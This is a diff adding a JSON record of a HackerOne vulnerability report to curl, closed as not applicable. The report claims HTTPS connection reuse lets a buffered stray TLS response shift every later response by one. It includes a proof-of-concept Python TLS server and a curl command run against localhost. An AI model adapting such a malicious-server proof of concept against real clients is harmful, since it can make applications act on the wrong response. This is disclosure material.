@@ -1,0 +1,120 @@
+{
+  "id": 4128703,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTI4NzAz",
+  "url": "https://hackerone.com/reports/4128703",
+  "title": "curl reuses an HTTPS connection when a response is already buffered in the TLS stack",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "medium",
+  "readable_substate": "N/A",
+  "created_at": "2026-10-19T19:15:52.104Z",
+  "submitted_at": "2026-10-19T19:15:52.551Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "shafran99",
+    "url": "/shafran99",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fol6xxqj7m9k08drkj98690q8rp0/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-20T21:39:05.020Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-19T19:43:41.860Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "curl master (`15292ed75`, `8.23.1-DEV`) reuses an idle HTTP/1.1-over-TLS\nconnection even when a complete extra response is already buffered in\nOpenSSL/GnuTLS. The `ef6b17cf1` fix only polls the socket:\n`Curl_cpool_conn_seems_healthy()` (`lib/conncache.c:1073`, called from\n`lib/url.c:1071`) uses `Curl_conn_is_alive()`, and `cf_ssl_is_alive()`\n(`lib/vtls/vtls.c:1287`) delegates to `cf_socket_conn_is_alive()`\n(`lib/cf-socket.c:1811`) without checking TLS buffers. The body read is\nclamped to `Content-Length` (`lib/transfer.c:187`), so the TLS read decrypts a\nwhole record, returns the body, and leaves the stray response buffered while\nthe socket is empty. Reproduced on OpenSSL 3.0.13 and GnuTLS 3.8.3 (OpenSSL\nalso with full certificate verification): `/b` gets `stray` instead of\n`second`, and every later response is shifted by one (RFC 9112 section 9.2).\nPlain HTTP is correctly not reused, and `tests/data/test1701` only covers\n`<server>http</server>`, so the fix has no TLS coverage. Fix: make\n`cf_ssl_is_alive()` report `SSL_pending()`/`SSL_has_pending()` (or the backend\nequivalent) as pending input, and add an HTTPS variant of test 1701.\n\n## Proof of Concept\n```sh\nopenssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem \\\n  -days 1 -subj /CN=localhost\npython3 poc.py 9443\n```\n`poc.py`:\n```python\nimport socket, ssl, sys, time\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\nctx.load_cert_chain(\"cert.pem\", \"key.pem\")\nsrv = socket.socket()\nsrv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nsrv.bind((\"0.0.0.0\", int(sys.argv[1])))\nsrv.listen(1)\nc, _ = srv.accept()\ns = ctx.wrap_socket(c, server_side=True)\nreq = b\"\"\nwhile b\"\\r\\n\\r\\n\" not in req:\n    req += s.recv(4096)\ns.sendall(b\"HTTP/1.1 200 OK\\r\\nContent-Length: 5\\r\\n\\r\\n\")\ntime.sleep(0.3)\ns.sendall(b\"first\" + b\"HTTP/1.1 200 OK\\r\\nContent-Length: 5\\r\\n\\r\\nstray\")\ntime.sleep(0.3)\ns.settimeout(3.0)\ntry:\n    s.recv(4096)  # second request on the reused connection\n    s.sendall(b\"HTTP/1.1 200 OK\\r\\nContent-Length: 6\\r\\n\\r\\nsecond\")\nexcept OSError:\n    pass\ns.close()\n```\nThen:\n```sh\ncurl -k -sS --http1.1 -w '\\n' https://127.0.0.1:9443/a https://127.0.0.1:9443/b\n```\nExpected (fixed):\n```\nfirst\nsecond\n```\nActual:\n```\nfirst\nstray\n```\n`curl -v` shows `Reusing existing https: connection` for `/b`. The PoC uses a\nsingle connection; if curl correctly opens a new one, `/b` stalls or is\nrefused.\n\n## Impact\n\nOn a reused HTTPS/1.1 connection, a server can make curl bind a response it\nsent earlier to a later request. The real response remains unread, so every\nsubsequent response is one request behind. Applications that rely on the\none-response-per-request mapping (authentication, caching, parsing,\nmulti-resource fetches on one handle) can act on the wrong response,\nviolating RFC 9112 section 9.2.",
+  "weakness": {
+    "id": 591,
+    "name": "Acceptance of Extraneous Untrusted Data With Trusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 7036420,
+      "file_name": "curl-tls-reuse-poc.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bu78bp7pjis8cez2adj9h6f7fpr8?response-content-disposition=attachment%3B%20filename%3D%22curl-tls-reuse-poc.py%22%3B%20filename%2A%3DUTF-8%27%27curl-tls-reuse-poc.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR7OT5KKL%2F20261020%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261020T220544Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIH4b%2Fp600aRHkjwVJAih4iFeiNkzMU%2FwLgRGeAES7Ab1AiAWuqUiF2pbGfhPvRDpCrrWNkubCaZl%2F6puLvmskMbhlSqyBQhLEAMaDDAxMzYxOTI3NDg0OSIMn%2F0FdA%2F%2BEGGVNjsjKo8FuBAX4H2ZdaxS9ivaTSCAjJlCzzp9zpHsr2yfJJK3dzU%2BOK3Z%2BRR9kugWacJOKEJqcg7LkwBKbsbP3KE%2F0Ev5JNIx%2FPndNAtYt0%2FHMkEVqCRbiQ%2BMhSRK0z1%2FGvCTHPJTgeuUz83dXuOidY2NHZFvMAXN1KrynFZYLEXtRWlTeeK23no6QQEf%2Bh1faMZk9oqJ6hbtwSo9kFB6X7wegHV6g%2FdYNuO5PGNOHJMgnl2bR%2Be8BtMy5qeoNFkcCOOA34c3buqzZqNw1M1y5SXrjJpMc%2BVF2v0BQYTkiiX%2F9QM7Fd3Zf5tJD83b9cHxiUMtJaD6G010027q97Nx%2BF5kWuUJHwNP1YXNpAmmtbYsk9SjFpmquv6%2B3DGkMsFTjnPzXZKaZXYhvKrU%2BWtvw3yNyHLIXv%2FJ8vUnlmMXaECv8OaFf8EklIcDT6IIU%2Bu%2BcgEXVvf%2FhpMZlD%2BGJmPpCvcRhpsd%2FEUm0YPxgoWNC8q9DSJ7%2BWwGZWgKxjaRVYMls9dTRB5XjA7N1iunEkvuIDp7XDI9BgAn59lK4Wc5Kk8PUjIQckq34sRSUWUO%2Fvj%2FBZ1rvWN%2FxU%2FwpVPs58EjyIueuko3IpsHyGVQqA5UQQVBd%2FfIo2z03t%2Bh40BJ8k1yVdSGl7uIrycqm7vH70wqVjHtJ%2FkenEAjMn9m7nXABfL2AVHvWPfRBPTpHttjz478tumkaK5liWd7BL3mGmz7gKzulHNj%2Fjx%2BDFaVcY4Skgtmny5hKXk%2FOPFBCEzSJwf%2BGbCjVTYXYEKNA%2FIhdh6v2JGkNYbFWh%2BPBkwf6Ge7WSCk%2F2Egh1bvqOkqtv19HBPx8KnF6XznRBEVNdY42KMdXQTejBUXlpfsDUCAmcHO1x0cxqwqTjCu3t7WBjqyAQalRK8ir2j0qKLwisFVBJ%2F3nbj27xW76mli5O6IaqAM5xFd9ZL1Y0UEqO02De6ttIve2Sb6oVh6WgKiH0%2F3LQOMTJAmg0nFLv4KOveoBHjzF2OhGG2EH3XDmkOe18GVX5svq4733P1C53nOtAoSQjMg8z4oq%2FQPCZHlMLwkrK%2BOSryVyQAQQ9QG4yJWbTUhC2sW70ovhr5pbbTZNwXLSrRlr5FdN%2B0mOCZQNmqcUCjUpT0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8664556d1f6e8b9b8ae8620a9e385d9bb3c7315c1bdb4803d378bd0ef5cbfca2",
+      "file_size": 3108,
+      "type": "application/x-sh",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
